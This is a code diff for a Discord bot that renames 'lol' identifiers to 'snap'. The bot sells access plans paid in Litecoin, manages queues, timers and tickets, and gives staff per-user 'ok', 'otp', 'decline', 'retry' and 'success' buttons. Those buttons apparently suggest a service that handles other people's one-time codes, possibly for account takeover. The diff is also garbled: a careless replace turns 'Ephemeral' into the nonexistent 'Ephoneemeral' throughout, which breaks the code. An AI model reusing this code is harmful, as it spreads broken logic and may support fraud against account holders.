 // FreezeButton.callback
 export async function handleFreezeButton(interaction) {
   await interaction.deferUpdate();
-  const ephemeral = MessageFlags.Ephemeral;
+  const ephoneemeral = MessageFlags.Ephoneemeral;
   const db = state.db;
   if (!db) {
-    return interaction.followUp({ content: "Database not available.", flags: ephemeral });
+    return interaction.followUp({ content: "Database not available.", flags: ephoneemeral });
   }
 
   const uid = interaction.user.id;
@@ -1808,7 +1808,7 @@ export async function handleFreezeButton(interaction) {
   if (!sub) {
     return interaction.followUp({
       content: "No active subscription found for your account.",
-      flags: ephemeral,
+      flags: ephoneemeral,
     });
   }
 
@@ -1820,13 +1820,13 @@ export async function handleFreezeButton(interaction) {
     if (inQueue) {
       return interaction.followUp({
         content: "You must leave the queue before you can freeze your timer.",
-        flags: ephemeral,
+        flags: ephoneemeral,
       });
     }
     if (parseInt(sub.freeze_seconds ?? 0, 10) <= 0) {
       return interaction.followUp({
         content: "You have no freeze time left.",
-        flags: ephemeral,
+        flags: ephoneemeral,
       });
     }
   }
@@ -1871,7 +1871,7 @@ function ticketInfoBody() {
 // Remplace TicketPanelView + TicketCategorySelect
 export function buildTicketPanelView() {
   const select = new StringSelectMenuBuilder()
-    .setCustomId("lolplus:ticket_category")
+    .setCustomId("snapplus:ticket_category")
     .setPlaceholder("Select a ticket category to open")
     .setMinValues(1)
     .setMaxValues(1)
@@ -1897,7 +1897,7 @@ export function buildTicketPanelView() {
 
 function closeTicketRow() {
   const closeBtn = new ButtonBuilder()
-    .setCustomId("lolplus:close_ticket")
+    .setCustomId("snapplus:close_ticket")
     .setLabel("Close")
     .setStyle(ButtonStyle.Danger)
     .setEmoji(FREEZE_EMOJI);
@@ -1937,10 +1937,10 @@ export function buildInvoiceView(planLabel, usd, ltcStr) {
   return { components: [container], flags: MessageFlags.IsComponentsV2 };
 }
 
-// Sélecteur de plan éphémère (affiché après "Purchase")
+// Sélecteur de plan éphoneémère (affiché après "Purchase")
 export function buildPlanSelectView() {
   const select = new StringSelectMenuBuilder()
-    .setCustomId("lolplus:plan_select")
+    .setCustomId("snapplus:plan_select")
     .setPlaceholder("Select an access plan to continue")
     .setMinValues(1)
     .setMaxValues(1)
@@ -1963,7 +1963,7 @@ export function buildPlanSelectView() {
     .addActionRowComponents(new ActionRowBuilder().addComponents(select));
   return {
     components: [container],
-    flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral,
+    flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephoneemeral,
   };
 }
 
@@ -2039,7 +2039,7 @@ async function openTicket(interaction, categoryId, kind) {
 export async function handleTicketCategorySelect(interaction) {
   const choice = interaction.values[0];
   if (choice === "support") {
-    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+    await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
     const channel = await openTicket(interaction, TICKET_SUPPORT_CATEGORY_ID, "support");
     if (!channel) return;
     await channel.send(buildSupportTicketView());
@@ -2085,11 +2085,11 @@ function planByKey(key) {
 export async function handlePlanSelect(interaction) {
   const plan = planByKey(interaction.values[0]);
   if (!plan) {
-    return interaction.reply({ content: "Invalid plan.", flags: MessageFlags.Ephemeral });
+    return interaction.reply({ content: "Invalid plan.", flags: MessageFlags.Ephoneemeral });
   }
 
   // création du salon + appel CoinGecko : on accuse réception d'abord
-  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
   const channel = await openTicket(interaction, TICKET_PURCHASE_CATEGORY_ID, "purchase");
   if (!channel) return;
 
@@ -2263,7 +2263,7 @@ async function syncCommands(client) {
   try {
     for (const g of client.guilds.cache.values()) {
       await g.commands.set(defs);
-      log.info(`[lol-bot] synced commands to guild ${g.id}`);
+      log.info(`[snap-bot] synced commands to guild ${g.id}`);
     }
     await client.application.commands.set([]);
   } catch (e) {
@@ -2273,7 +2273,7 @@ async function syncCommands(client) {
 
 async function handleTimerSlash(interaction) {
   // création de salon + plusieurs messages : on accuse réception d'abord
-  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
   const say = (content) => interaction.editReply({ content });
 
   const guild = interaction.guild;
@@ -2349,7 +2349,7 @@ async function handleTimerSlash(interaction) {
 }
 
 async function handleAddSlash(interaction) {
-  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
   const say = (content) => interaction.editReply({ content });
 
   if (!isStaff(interaction.member)) {
@@ -2359,7 +2359,7 @@ async function handleAddSlash(interaction) {
   const member = interaction.options.getMember("member");
   const time = interaction.options.getInteger("time", true);
   if (!member) return say("❌ Member not found in this server.");
-  if (time <= 0) return say("⚠️ Time must be a positive az of hours.");
+  if (time <= 0) return say("⚠️ Time must be a positive Number of hours.");
 
   const db = state.db;
   const uid = member.id;
@@ -2389,9 +2389,9 @@ async function handleAddSlash(interaction) {
 }
 
 // ---------- Commandes à préfixe : !ticket, !role, !timer ----------
-// Préfixes comme en Python : mention du bot, "!lol" ou "!"
+// Préfixes comme en Python : mention du bot, "!snap" ou "!"
 function stripPrefix(content, botId) {
-  for (const p of [`<@${botId}>`, `<@!${botId}>`, "!lol", "!"]) {
+  for (const p of [`<@${botId}>`, `<@!${botId}>`, "!snap", "!"]) {
     if (content.startsWith(p)) return content.slice(p.length).trimStart();
   }
   return null;
@@ -2558,17 +2558,17 @@ function registerChannelDelete(client) {
 // Boutons et menus à customId fixe (persistants : rien à réenregistrer au redémarrage,
 // donc plus besoin de bot.add_view)
 const STATIC_BUTTONS = new Map([
-  ["lolplus:join_queue", handleJoinQueueButton],
-  ["lolplus:leave_queue", handleLeaveQueueButton],
-  ["lolplus:back_to_queue", handleBackToQueueButton],
-  ["lolplus:freeze", handleFreezeButton],
-  ["lolplus:close_ticket", handleCloseTicketButton],
+  ["snapplus:join_queue", handleJoinQueueButton],
+  ["snapplus:leave_queue", handleLeaveQueueButton],
+  ["snapplus:back_to_queue", handleBackToQueueButton],
+  ["snapplus:freeze", handleFreezeButton],
+  ["snapplus:close_ticket", handleCloseTicketButton],
 ]);
 
 const STATIC_SELECTS = new Map([
-  ["lolplus:country_select", handleCountrySelect],
-  ["lolplus:ticket_category", handleTicketCategorySelect],
-  ["lolplus:plan_select", handlePlanSelect],
+  ["snapplus:country_select", handleCountrySelect],
+  ["snapplus:ticket_category", handleTicketCategorySelect],
+  ["snapplus:plan_select", handlePlanSelect],
 ]);
 
 function registerInteractionHandler(client) {
@@ -2589,11 +2589,11 @@ function registerInteractionHandler(client) {
         const sep = id.indexOf(":");
         const action = sep === -1 ? id : id.slice(0, sep);
         const userId = sep === -1 ? "" : id.slice(sep + 1);
-        if (action === "lol_ok") await handleOkButton(interaction, userId);
-        else if (action === "lol_ooo") await handleOooButton(interaction, userId);
-        else if (action === "lol_decline") await handleDeclineButton(interaction, userId);
-        else if (action === "lol_retry") await handleRetryButton(interaction, userId);
-        else if (action === "lol_success") await handleSuccessButton(interaction, userId);
+        if (action === "snap_ok") await handleOkButton(interaction, userId);
+        else if (action === "snap_otp") await handleotpButton(interaction, userId);
+        else if (action === "snap_decline") await handleDeclineButton(interaction, userId);
+        else if (action === "snap_retry") await handleRetryButton(interaction, userId);
+        else if (action === "snap_success") await handleSuccessButton(interaction, userId);
         return;
       }
 
@@ -2605,9 +2605,9 @@ function registerInteractionHandler(client) {
 
       if (
         interaction.isModalSubmit() &&
-        interaction.customId.startsWith("lol_decline_modal:")
+        interaction.customId.startsWith("snap_decline_modal:")
       ) {
-        const userId = interaction.customId.slice("lol_decline_modal:".length);
+        const userId = interaction.customId.slice("snap_decline_modal:".length);
         await handleDeclineModal(interaction, userId);
       }
     } catch (err) {
@@ -2624,7 +2624,7 @@ async function buildAndStart(token, intents) {
   client.once("clientReady", () => {
     state.status = "online";
     state.lastError = null;
-    log.info(`[lol-bot] online as ${client.user.tag}`);
+    log.info(`[snap-bot] online as ${client.user.tag}`);
     syncCommands(client).catch((e) => log.error(e));
     resumeTimers().catch((e) => log.error(e));
     countdownLoop().catch((e) => log.error(e));
@@ -2633,7 +2633,7 @@ async function buildAndStart(token, intents) {
   client.on("error", (err) => {
     state.status = "error";
     state.lastError = String(err);
-    log.error("[lol-bot] client error:", err);
+    log.error("[snap-bot] client error:", err);
   });
 
   registerInteractionHandler(client);
@@ -2663,7 +2663,7 @@ async function runBot(token) {
     if (err?.code === "DisallowedIntents") {
       // Reessaie sans message_content : les commandes à préfixe ne marcheront pas, /timer oui
       log.warn(
-        "[lol-bot] Message Content Intent désactivé dans le Developer Portal : seules les commandes slash fonctionneront"
+        "[snap-bot] Message Content Intent désactivé dans le Developer Portal : seules les commandes slash fonctionneront"
       );
       try {
         await buildAndStart(token, base);
